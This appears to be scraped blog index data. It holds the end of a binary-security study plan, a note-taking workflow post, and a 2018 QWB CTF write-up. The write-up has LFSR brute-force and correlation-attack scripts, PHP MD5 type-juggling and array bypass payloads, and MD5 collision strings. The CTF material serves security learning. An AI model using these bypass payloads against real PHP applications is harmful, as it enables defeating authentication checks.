学习与创造漏洞挖掘与利用技巧 重构系统（Reconstruction） 设计与构建系统防护 基础课程学习 核心基础课程——计算机的工作原理 体系结构\nCPU的设计与实现 机器指令与汇编语言 指令的解码、执行 内存管理 CMU 18-447 Introduction to Computer Architecture https://www.ece.cmu.edu/~ece447/s15/doku.php Labs: implement a MIPS CPU using Verilog 编译原理\n编译器的设计与实现 自动机、词法分析、句法分析 运行时 程序静态分析 Stanford CS-143 - Compilers http://web.stanford.edu/class/cs143/ PA: Compilers for cool language 操作系统\n操作系统的设计与实现\n系统的加载与引导 用户态和内核态、系统调用、中断和驱动 进程于内存管理、文件系统 虚拟机 NT 6.828 - Operating System Engineering\nhttps://pdos.csail.mit.edu/6.828/2016/\nLabs: Implement jos\nXv6 , a simple Unix-like teaching operating system\n其他基础课程——系统软件开发基础 编程语言\n网络协议\n算法与数据结构\n漏洞挖掘与利用 快速入门——CTF 蓝莲花战队CTF成长秘诀——坚持超过一年的以赛代练 9447CTF、CCC CTF、HITCON CTF、Plaid CTF、Boston Key Party、DEF CON CTF CTF 历史资料库：https://github.com/ctfs Wargames: https://pwnable.kr/\nhttp://smashthestack.org/\n如何从CTF赛棍转型 CTF 短时间（48h）、目标代码量少、漏洞容易发现、利用技巧千奇百怪 实战——长期做一道很难的CTF题 长期（长年累月）、目标代码量大、漏洞难以发现、利用技术有套路可循 实战 目标 网络协议的实现 HTTP/SMB/DNS/UPnP Server 脚本引擎 JavaScript Engine ActionScript Engine PHP/Java Sandbox Escape 内核 Linux/Android Freebsd Apple iOS Sony PS4 准备 学习历史漏洞 - CVEs 挖掘新漏洞 逆向分析+代码审计 快速逆向与快速理解 对漏洞的理解 模糊测试 测试框架 样例生成的想法 构建系统防护 研究与探索 漏洞自动挖掘技术 静态程序分析 符号执行 机器学习 漏洞利用防护机制 Intel SGX 控制流完整性（CFI） 拟态 ","permalink":"https://ret2neo.cn/post/180404binstarter/","summary":"note of https://www.ichunqiu.com/course/56927\nHacking三步曲 理解系统（Understanding） 系统性的基础课程学习，深入理解计算机系统运作机制。 破坏系统（Breaking） 学习与创造漏洞挖掘与利用技巧 重构系统（Reconstruction） 设计与构建系统防护 基础课程学习 核心基础课程——计算机的工作原理 体系结构\nCPU的设计与实现 机器指令与汇编语言 指令的解码、执行 内存管理 CMU 18-447 Introduction to Computer Architecture https://www.ece.cmu.edu/~ece447/s15/doku.php Labs: implement a MIPS CPU using Verilog 编译原理\n编译器的设计与实现 自动机、词法分析、句法分析 运行时 程序静态分析 Stanford CS-143 - Compilers http://web.stanford.edu/class/cs143/ PA: Compilers for cool language 操作系统\n操作系统的设计与实现\n系统的加载与引导 用户态和内核态、系统调用、中断和驱动 进程于内存管理、文件系统 虚拟机 NT 6.828 - Operating System Engineering\nhttps://pdos.csail.mit.edu/6.828/2016/\nLabs: Implement jos\nXv6 , a simple Unix-like teaching operating system","title":"二进制安全学习规划指南"},{"content":"阶段性地优雅地解决了这个问题！\n前段时间因为印象笔记同步出错我不得不购买其高级版本来恢复历史，但是它随着内容增多日渐卡顿这一点令人愈发难以忍受，此外，不支持markdown也一直如鲠在喉，于是我决定再试试之前因为广告问题不愿多用的有道云笔记，竟然发现它非常流畅，支持多层级目录，支持markdown，界面优雅，这让印象笔记之于它就像IE之于Chrome，没办法，我想我只能选择Chrome。\n但是有道云也有些小问题，一是markdown不支持直接使用本地图片，二是不支持公式渲染。总的来说，它的markdown编辑功能和Typora比起来简直是小巫见大巫。稍加探索，发现一个有趣的情况，就是有道云笔记新建的markdown笔记就是以同名markdown格式文件保存在本地的，这样一来不就可以用Typora直接编辑了？\n所以以后记笔记的工作流就变成了：\n打开有道云笔记=\u0026gt;新建markdown笔记foo.md=\u0026gt;使用神器Everything搜索foo.md=\u0026gt;用默认关联md文件的Typora打开=\u0026gt;编辑md文件=\u0026gt;回到有道云笔记，刷新文件预览（点到别的笔记，再回到foo.md，文件内容会重新加载）\n非常完美。\nTypora从0.9.47版本左右开始支持直接粘贴剪贴板图片，默认以时间戳为文件名保存到temp文件夹（可以在 偏好设置-\u0026gt;编辑器-\u0026gt;图片插入 中设置默认保存位置）来引用，并且支持直接复制到其他文件夹，真是非常棒的体验，必须感谢开发者！\n另外，有道云不支持C:\\foo\\bar.jpg 的引用，但是C:/foo/bar/jpg 却可以被识别；Typora两者都可以识别。\n所以当我们回到插入图片的问题，就会发现这不是问题了。只要在Typora编辑完毕后将所有图片复制到一个目录（比如C:/foo/ynote/img）下（如果后续Typora图片粘贴加入了自定义任意文件夹的功能，那么复制这一步也可省去了），然后CTRL+H 将所有图片引用地址中的目录部分一键替换成有道云笔记可解析的形式（如将C:/Users/PCName/AppData/Local/Temp/替换成C:\\foo\\ynote\\img\\），这样在有道云笔记和Typora中就都可以预览了。\n那么C:/foo/ynote/img 下的图片岂不是就不可以同步了，是的，但比起清爽的体验这只是小节了，我们可以把该目录用坚果云等同步软件同步一下就好了。\n话说回来，坚果云+Typora+本地文件系统 不就够了，还要什么自行车？\n","permalink":"https://ret2neo.cn/post/180327ynotewithtypora/","summary":"阶段性地优雅地解决了这个问题！\n前段时间因为印象笔记同步出错我不得不购买其高级版本来恢复历史，但是它随着内容增多日渐卡顿这一点令人愈发难以忍受，此外，不支持markdown也一直如鲠在喉，于是我决定再试试之前因为广告问题不愿多用的有道云笔记，竟然发现它非常流畅，支持多层级目录，支持markdown，界面优雅，这让印象笔记之于它就像IE之于Chrome，没办法，我想我只能选择Chrome。\n但是有道云也有些小问题，一是markdown不支持直接使用本地图片，二是不支持公式渲染。总的来说，它的markdown编辑功能和Typora比起来简直是小巫见大巫。稍加探索，发现一个有趣的情况，就是有道云笔记新建的markdown笔记就是以同名markdown格式文件保存在本地的，这样一来不就可以用Typora直接编辑了？\n所以以后记笔记的工作流就变成了：\n打开有道云笔记=\u0026gt;新建markdown笔记foo.md=\u0026gt;使用神器Everything搜索foo.md=\u0026gt;用默认关联md文件的Typora打开=\u0026gt;编辑md文件=\u0026gt;回到有道云笔记，刷新文件预览（点到别的笔记，再回到foo.md，文件内容会重新加载）\n非常完美。\nTypora从0.9.47版本左右开始支持直接粘贴剪贴板图片，默认以时间戳为文件名保存到temp文件夹（可以在 偏好设置-\u0026gt;编辑器-\u0026gt;图片插入 中设置默认保存位置）来引用，并且支持直接复制到其他文件夹，真是非常棒的体验，必须感谢开发者！\n另外，有道云不支持C:\\foo\\bar.jpg 的引用，但是C:/foo/bar/jpg 却可以被识别；Typora两者都可以识别。\n所以当我们回到插入图片的问题，就会发现这不是问题了。只要在Typora编辑完毕后将所有图片复制到一个目录（比如C:/foo/ynote/img）下（如果后续Typora图片粘贴加入了自定义任意文件夹的功能，那么复制这一步也可省去了），然后CTRL+H 将所有图片引用地址中的目录部分一键替换成有道云笔记可解析的形式（如将C:/Users/PCName/AppData/Local/Temp/替换成C:\\foo\\ynote\\img\\），这样在有道云笔记和Typora中就都可以预览了。\n那么C:/foo/ynote/img 下的图片岂不是就不可以同步了，是的，但比起清爽的体验这只是小节了，我们可以把该目录用坚果云等同步软件同步一下就好了。\n话说回来，坚果云+Typora+本地文件系统 不就够了，还要什么自行车？","title":"有道云笔记markdown文档插入图片"},{"content":"MISC Welcome 使用stegsolve打开，在Analyse-\u0026gt;Stereogram Solver 处改变偏移即可。\nCrypto streamgame1 streamgame1.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==25 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask = 0b1010011000100011100 f=open(\u0026#34;key\u0026#34;,\u0026#34;ab\u0026#34;) for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out f.write(chr(tmp)) f.close() solution\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def crack(key): for k in range(0,2**19): R=k for i in range(12): tmp,flag=0,1 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out if(chr(tmp)!=key[i]): flag=0 break if flag: print \u0026#34;flag{%s}\u0026#34;%bin(k)[2:] crack(open(\u0026#39;key\u0026#39;,\u0026#39;rb\u0026#39;).read()) # flag{1110101100001101011} streamgame2 streamgame2.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==27 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask=0x100002 f=open(\u0026#34;key\u0026#34;,\u0026#34;ab\u0026#34;) for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out f.write(chr(tmp)) f.close() solution\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def crack(key): for k in range(0,2**21): R=k for i in range(12): tmp=0 flag=1 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out if(chr(tmp)!=key[i]): flag=0 break if flag: print \u0026#34;flag{%s}\u0026#34;%bin(k)[2:] crack(open(\u0026#39;key\u0026#39;,\u0026#39;rb\u0026#39;).read()) # flag{110111100101001101001} streamgame3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==24 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i = (R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) def single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask): (R1_NEW,x1)=lfsr(R1,R1_mask) (R2_NEW,x2)=lfsr(R2,R2_mask) (R3_NEW,x3)=lfsr(R3,R3_mask) return (R1_NEW, R2_NEW, R3_NEW, (x1*x2)^((x2^1)*x3) ) R1=int(flag[5:11],16) R2=int(flag[11:17],16) R3=int(flag[17:23],16) assert len(bin(R1)[2:])==17 assert len(bin(R2)[2:])==19 assert len(bin(R3)[2:])==21 R1_mask=0x10020 R2_mask=0x4100c R3_mask=0x100002 for fi in range(1024): print fi tmp1mb=\u0026#34;\u0026#34; for i in range(1024): tmp1kb=\u0026#34;\u0026#34; for j in range(1024): tmp=0 for k in range(8): (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask) tmp = (tmp \u0026lt;\u0026lt; 1) ^ out tmp1kb+=chr(tmp) tmp1mb+=tmp1kb f = open(\u0026#34;./output/\u0026#34; + str(fi), \u0026#34;ab\u0026#34;) f.write(tmp1mb) f.close() solution\n如果两个随机二进制串不相关，那么将它们逐位比对，有1/2的概率相等，如果是三进制串，则概率为1/3，以此类推。写个小脚本验证一下：\n相反的，如果两个随机二进制串之间的存在关联，那么概率就不会是1/2了。\n对于 x1,x2,x3∈{0,1} 考虑逻辑运算 out=(x1*x2)^((x2^1)*x3) ，\n若x2=0 ，则out=x3 ，若x2=1 则out=x1 。\n那么p(out=x3) = p(out=x3|x2=0) * p(x2=0)+ p(out=x3|x2=1) * p(x2=1)=(1+1/2) * 1/2 = 3/4 != 1/2 ，\n对于x1同理有p(out=x1)=3/4 != 1/2 。\n这个题目直观的想法和前两题一样，遍历R1，R2，R3三个寄存器所有可能的初始状态，但因为可能性过多在计算上是不可行的。上面提到的这种相关性提供了一种各个击破的思路：遍历R1的所有可能，计算其与out的相关性，逼近3/4的就可能是其初始状态，越逼近可能性越大，对R3同理。\n这种基于相关性的攻击称为相关攻击（correlation attack），其分而治之的技巧可以降低爆破复杂度，比相关攻击复杂度更低的都可以称为快速相关攻击（也有一些经典的手法，不过目前还没很理解）。\n本题采用相关攻击就可以在可接受时间内得到R1，R3的初始状态。\n初始状态的可选空间越大，就需要越长的结果序列来判定。R1，R3分别大概7字节和17字节就足够了。\n然后爆破R2就不难了。\n全部代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import time cipher=\u0026#39;\u0026#39;.join([bin(ord(i))[2:].zfill(8) for i in open(\u0026#34;output/0\u0026#34;,\u0026#34;rb\u0026#34;).read()]) R1_mask=0x10020 ; R2_mask=0x4100c ; R3_mask=0x100002 R1_range=xrange(2**16,2**17) R2_range=xrange(2**18,2**19) R3_range=xrange(2**20,2**21) def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) def single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask): (R1_NEW,x1)=lfsr(R1,R1_mask) (R2_NEW,x2)=lfsr(R2,R2_mask) (R3_NEW,x3)=lfsr(R3,R3_mask) return (R1_NEW, R2_NEW, R3_NEW, (x1*x2)^((x2^1)*x3) ) def calcRelation(a,b): assert len(a)==len(b) cnt=0.0 for i,j in zip(a,b): cnt+=(i==j) return cnt/len(a) def get_most_related(R_range,R_mask,cmp_length): real_R,relation=0,0 for i in R_range: R,tmp=i,\u0026#34;\u0026#34; for j in xrange(cmp_length*8): R,out=lfsr(R,R_mask) tmp+=str(out) r=calcRelation(cipher[:cmp_length*8],tmp) if r\u0026gt;relation: relation=r real_R=i return (real_R,relation) def bruteR13(): R1,r=get_most_related(R1_range,R1_mask,7) R3,r=get_most_related(R3_range,R3_mask,17) return (R1,R3) def brute(): R1_,R3_=bruteR13() # R1_,R3_=0x1b9cb,0x16b2f3 print \u0026#34;R1=%s,R3=%s\u0026#34;%(R1_,R3_) print time.asctime() for i in R2_range: R1,R2,R3=R1_,i,R3_ res=\u0026#39;\u0026#39; for j in range(40): (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask) res+=str(out) if cipher[:len(res)]==res: print \u0026#39;flag{\u0026#39;+\u0026#39;\u0026#39;.join(map(lambda x:hex(x)[2:],(R1_,i,R3_)))+\u0026#39;}\u0026#39; print time.asctime() brute() print time.asctime() # Thu May 03 21:56:46 2018 # R1=113099,R3=1487603 # Thu May 03 22:01:41 2018 # flag{1b9cb5979c16b2f3} # Thu May 03 22:02:41 2018 # [Finished in 357.3s] 参考：http://blog.leanote.com/post/xp0intjnu@gmail.com/66c91498d13b\nstreamgame4 streamgame4.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==27 def nlfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 changesign=True while i!=0: if changesign: lastbit \u0026amp;= (i \u0026amp; 1) changesign=False else: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask=0b110110011011001101110 f=open(\u0026#34;key\u0026#34;,\u0026#34;ab\u0026#34;) for i in range(1024*1024): tmp=0 for j in range(8): (R,out)=nlfsr(R,mask) tmp=(tmp \u0026lt;\u0026lt; 1)^out f.write(chr(tmp)) f.close() solution\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def crack(key): for maybe in range(2**21,0,-1): flag=0 R=maybe for index in xrange(len(key)): tmp=0 for j in range(8): (R,out)=nlfsr(R,mask) tmp=(tmp\u0026lt;\u0026lt;1)^out if chr(tmp)!=key[index]: flag=1 break if not flag: print \u0026#34;flag{%s}\u0026#34;%bin(maybe)[2:] crack(open(\u0026#34;key\u0026#34;,\u0026#39;r\u0026#39;).read()) #flag{100100111010101101011} nextrsa nc 39.107.33.90 9999\n这是一个RSA相关安全问题的合集，是个很有意思值得一做的题目。\n题目源码已公开在GitHub：https://github.com/fpbibi/nextrsa\n可参考以下链接：\nhttp://www.cnblogs.com/WangAoBo/p/8654120.html https://www.anquanke.com/post/id/84632 https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/ https://bbs.ichunqiu.com/thread-36705-1-1.html Web Web签到 The Fisrt Easy Md5 Challenge 1 2 3 if($_POST[\u0026#39;param1\u0026#39;]!=$_POST[\u0026#39;param2\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;param1\u0026#39;])==md5($_POST[\u0026#39;param2\u0026#39;])){ die(\u0026#34;success!\u0026#34;); } 可用PHP弱类型或者数组绕过。\npost param1=QNKCDZO\u0026amp;param2=240610708 或者 param1[]=\u0026amp;param2[]=0 。\nThe Second Easy Md5 Challenge 1 2 3 if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ die(\u0026#34;success!\u0026#34;); } 可用PHP数组绕过。post param1[]=\u0026amp;param2[]=0 。\nMd5 Revenge Now! 1 2 3 if((string)$_POST[\u0026#39;param1\u0026#39;]!==(string)$_POST[\u0026#39;param2\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ die(\u0026#34;success!); } 绕不过去，但是因为哈希是从无限集到有限集的映射，必然存在两个不同的消息拥有相同的哈希值，而且这种消息对已经可以被构造了。（工具： https://xz.aliyun.com/t/2232 ）\nhttps://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value\n1 2 3 4 5 s1=\u0026#34;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2\u0026#34; s2=\u0026#34;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2\u0026#34; y=lambda s: \u0026#34;%\u0026#34;+\u0026#34;%\u0026#34;.join([s[i*2:i*2+2] for i in range(len(s)/2)]) print y(s1) print y(s2) 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $param1=urldecode(\u0026#34;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\u0026#34;); $param2=urldecode(\u0026#34;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\u0026#34;); print md5($param1).\u0026#34;\\n\u0026#34;; print md5($param2).\u0026#34;\\n\u0026#34;; print md5($param1)===md5($param2); print \u0026#34;\\n\u0026#34;; ?\u0026gt; //008ee33a9d58b51cfeb425b0959121c9 //008ee33a9d58b51cfeb425b0959121c9 //1 附件 Welcome\n[streamgame1](StreamGame1_zip_1y829eyn1723891s827h3 -.zip)\nstreamgame2\nstreamgame3\nstreamgame4\n题目备份 https://github.com/jas502n/2018-QWB-CTF\nstream\n奇怪的心路~ streamgame3.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 from flag import flag assert flag.startswith(\u0026#34;flag{\u0026#34;) assert flag.endswith(\u0026#34;}\u0026#34;) assert len(flag)==24 # flag共24个字符，形如 /flag{.{18}}/ # 中间18个字符就是我们想寻找的lfsr初始状态 def lfsr(R,mask): \u0026#34;\u0026#34;\u0026#34;定义了一个lfsr的状态变化规则 输入是寄存器当前存储的状态信息和一个掩码， 两者经过一定运算得到寄存器下一个状态并输出 \u0026#34;\u0026#34;\u0026#34; output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff #将当前值左移一位，并舍弃超出 24bit 的部分 #这就是线性反馈移位寄存器的 `移位` 部分 #可以理解为 output = (R * 2) % 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff #将当前值和掩码按位与，只使用某些固定位的信息 #如对于 R3_mask=0x100002 ，只使用当前值左起第四位和右起第二位 #对比线性函数的定义，发现0x100002的每一位对应的就是f中的a1,a2,...,a24， #其中a4=a23=1,a1=a2=a3=a5=...=a22=a24=0 #而R的每一位对应的是b1,b2,...b24 #那么 `R\u0026amp;mask` 就将f中用于异或的每一项都求出来并保存在i的每一位中 #（我认为 `\u0026amp;0xffffff` 是多余的，R和mask都总在24位以内） lastbit=0 # lastbit实际上是函数中的a0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 # 这个循环用于取出i中的每一位并完成异或操作，i中有奇数个1则lastbit为1，反之为0 # 得到的lastbit就是【寄存器当前状态的线性函数】f的函数值 # lastbit就是所谓的 `线性反馈` ，它与寄存器当前状态线性相关， # 并作为输入位，用以产生寄存器的下一个状态 output^=lastbit # 产生寄存器的下一个状态 return (output,lastbit) def single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask): \u0026#34;\u0026#34;\u0026#34;完成三个线性反馈移位寄存器的一次状态变换 并将三个反馈进行简单运算（x1x2 ^ x2\u0026#39;x3）后返回 --【我现在明白过来了，我在 http://findneo.github.io/180325QWBWP/#streamgame3 中提到的一个失败的尝试为什么会失败，：） 就是因为最后文件中保存的每个bit都只是这个简单运算的结果 而这个简单的运算导致了每个single_round中反馈的信息 从3个bit降到了1个bit】-- \u0026#34;\u0026#34;\u0026#34; (R1_NEW,x1)=lfsr(R1,R1_mask) (R2_NEW,x2)=lfsr(R2,R2_mask) (R3_NEW,x3)=lfsr(R3,R3_mask) return (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^1)*x3)) R1=int(flag[5:11],16) R2=int(flag[11:17],16) R3=int(flag[17:23],16) assert len(bin(R1)[2:])==17 assert len(bin(R2)[2:])==19 assert len(bin(R3)[2:])==21 R1_mask=0x10020 R2_mask=0x4100c R3_mask=0x100002 for fi in range(1024): print fi tmp1mb=\u0026#34;\u0026#34; for i in range(1024): tmp1kb=\u0026#34;\u0026#34; for j in range(1024): tmp=0 for k in range(8): (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask) tmp = (tmp \u0026lt;\u0026lt; 1) ^ out tmp1kb+=chr(tmp) tmp1mb+=tmp1kb f = open(\u0026#34;./output/\u0026#34; + str(fi), \u0026#34;ab\u0026#34;) f.write(tmp1mb) f.close() solution\n因为抽头较少，所以生成序列的每一位都只和初始状态的少数几位有关，如果每一轮分开考虑，再手动合并初始状态，遍历集合会小非常多。折腾了很久才发现自己要写的是递归，写了很多代码但是不work🤔，到比赛最后也没调出来。\n赛后总算按我的意愿跑起来了，但是马上发现自己太天真，这代码就是跑到爆栈也没办法得到结果，看来还是要认真理解原理，从算法上突破，暴力 x 不可取。下面是我已被证明不可取的想法（我居然在试图攻破安全高效的伪随机序列发生器，真是naive啊）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #coding:utf8 import itertools # 因为掩码的原因，大大降低了计算的复杂度。我们可以在每次规约运算时只遍历影响结果的位，而忽略其他将被掩码忽略的位。 # 这样实际上复杂度从每一次规约都有2**（17+19+21）=2**57约10**18种可能降低到了每一位约大概2**8种可能！ # 对我来说，编程实现的难点在于如何控制只遍历影响结果的位，一种是在原来的基础上加一个判断，判断是否该情况已被考虑，这应该不合适。 # 另一种就是用一个list装R的每一位 # 再有就是手动组合三个部分的每次反馈 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) def single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask): (R1_NEW,x1)=lfsr(R1,R1_mask) (R2_NEW,x2)=lfsr(R2,R2_mask) (R3_NEW,x3)=lfsr(R3,R3_mask) return (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^1)*x3)) # lastbit=(R.count(1)%2?1:0) R*右边加一位lastbit # R1sm means R1_sub_mask R1_mask=0x10020;R1sm=[];R1sm.extend([0x10000,0x20]) R2_mask=0x4100c;R2sm=[];R2sm.extend([0x40000,0x1000,0x8,0x4]) R3_mask=0x100002;R3sm=[];R3sm.extend([0x100000,0x2]) def genAll(Rsm): # 全组合 all_iter=[itertools.combinations(Rsm,num) for num in xrange(len(Rsm)+1)] return itertools.chain.from_iterable(all_iter) def genBit(sub_mask,seq,mask): ret=0 for i in sub_mask: ret|=i done=mask if seq==0:done=0 else: for i in range(seq): done|=(mask\u0026gt;\u0026gt;i) ret\u0026amp;=(done^0xffffff)\u0026amp;(0xffffff\u0026lt;\u0026lt;seq) return ret def digui(level,R1,R2,R3): if level==996: print hex(R1),hex(R2),hex(R3) return 0 for g,h,n in itertools.product(genAll(R1sm),genAll(R2sm),genAll(R3sm)): R1|=genBit(g,level,R1_mask) R2|=genBit(h,level,R2_mask) R3|=genBit(n,level,R3_mask) (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask) if out==((ord(f[level/8])\u0026gt;\u0026gt;(7-(level%8)))\u0026amp;0x1): digui(level+1,R1,R2,R3) f=open(\u0026#34;output/0\u0026#34;).read() digui(0,0,0,0) 据说是考察快速相关攻击，与WHCTF一题相似，在 https://www.xctf.org.cn/library/details/whctf-writeup/ 搜索Bornpig即可看到相关信息。\n我还找到一些相关信息，但暂时没有时间深入解决。\n快速相关攻击报告 关于线性移位寄存器和快速相关攻击中的算法A和算法B详细分析解答 线性反馈移位寄存器与梅森旋转算法 流密码快速相关攻击综述 去了解了一下线性反馈移位寄存器，理解一些概念，对代码做了些注释。\nIn electronics, a flip-flop or latch is a circuit that has two stable states and can be used to store state information. flip-flop（触发器）或latch（锁存器）都是某种电路，都根据输入改变存储的状态信息，区别是前者当时钟有效时改变才发生，也就是同步的，后者是时钟无关的，也就是异步的。 a shift register is a cascade of flip flops 。 移位寄存器是触发器的级联。 In computing, a linear-feedback shift register (LFSR) is a shift register whose input bit is a linear function of its previous state.\n线性反馈移位寄存器是一个移位寄存器，它的输入位是它先前状态的线性函数。 线性指的是齐次性（f(αx) = αf(x) for all α）和可加性（ f(x + y) = f(x) + f(y)），两者在有理数域是等价的。上述定义中的线性函数实际上指的是布尔代数中的线性函数，形式上这样表述： 对于 ，存在 ，使得 ，那么f 是一个线性函数。（其中的符号分别表示逻辑异或和逻辑与 ，详情如下图） 有一位朋友在这篇文章提到一种基于outbit=(x1*x2)^((x2^1)*x3) 从而当x1==x3 时x1==outbit 来略过R2而只爆破R1和R3的做法，我实现了一下，感觉复杂度仍然不可接受。~~\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def lfsr(R,mask): output = (R \u0026lt;\u0026lt; 1) \u0026amp; 0xffffff i=(R\u0026amp;mask)\u0026amp;0xffffff lastbit=0 while i!=0: lastbit^=(i\u0026amp;1) i=i\u0026gt;\u0026gt;1 output^=lastbit return (output,lastbit) R1_mask=0x10020 R2_mask=0x4100c R3_mask=0x100002 import time s=\u0026#39;\u0026#39;.join([bin(ord(i))[2].zfill(8) for i in open(\u0026#34;output/0\u0026#34;,\u0026#34;rb\u0026#34;).read()]) def handle1(start,step): for i in xrange(start,start+step): for j in xrange(2**20,2**21): R1,R3,flag=i,j,1 for offset in xrange(len(s)): R1,out1=lfsr(R1,R1_mask) R3,out3=lfsr(R3,R3_mask) if out1==out3 and out1!=s[offset]: flag=0 break if flag: print \u0026#34;flag{%s******%s}\u0026#34;%(bin(i)[2:],bin(j)[2:]) print time.asctime() exit(0) if (i-start)%10==0: print start,time.asctime(),\u0026#34;#\u0026#34; handle1(2**16,2**16) 受他启发，我有了个基于outbit==(x2==1?x1:x3) 